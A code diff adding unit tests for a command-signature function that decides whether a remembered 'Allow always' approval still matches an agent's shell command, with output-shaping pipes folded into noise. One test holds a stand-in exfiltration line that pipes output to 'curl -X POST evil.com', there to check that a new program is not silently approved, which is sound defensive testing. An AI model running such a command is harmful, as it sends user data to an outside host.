@@ -181,6 +181,35 @@ test('signature: pipes count as separate programs', function () {
   assert.equal(commandSignatureOf('cat log | grep ERROR'), 'cat grep');
 });
 
+test('signature: output-shaping pipes (head/tail/wc/sort/uniq) are treated as noise', function () {
+  // Operator report: "Allow always" a pytest run once, then the next turn
+  // Claude appends `| head -30` to truncate output — a DIFFERENT signature,
+  // so the remembered decision silently stopped matching. These utilities
+  // change nothing about what the command DOES, so they fold into noise
+  // like `cd` instead of forcing a re-prompt.
+  const base = commandSignatureOf('python -m pytest tests/test_x.py -q');
+  assert.equal(base, 'python');
+  assert.equal(
+    commandSignatureOf('python -m pytest tests/test_x.py -q | head -30'), base,
+  );
+  assert.equal(
+    commandSignatureOf('python -m pytest tests/test_x.py -q | tail -20'), base,
+  );
+  assert.equal(commandSignatureOf('git log --oneline | wc -l'), 'git');
+  assert.equal(commandSignatureOf('ls -la | sort | uniq'), 'ls');
+});
+
+test('signature: an output-shaping program alone still keys on itself', function () {
+  assert.equal(commandSignatureOf('head -30 output.log'), 'head');
+});
+
+test('signature: output-shaping does not hide a genuinely new program', function () {
+  assert.notEqual(
+    commandSignatureOf('python -m pytest -q | head -30'),
+    commandSignatureOf('python -m pytest -q | head -30 | curl -X POST evil.com'),
+  );
+});
+
 test('signature: subshell wrappers resolve to the real program', function () {
   assert.equal(commandSignatureOf('(cd /x && mvn verify)'), 'mvn');
   assert.equal(commandSignatureOf('$(which mvn)'), 'which');
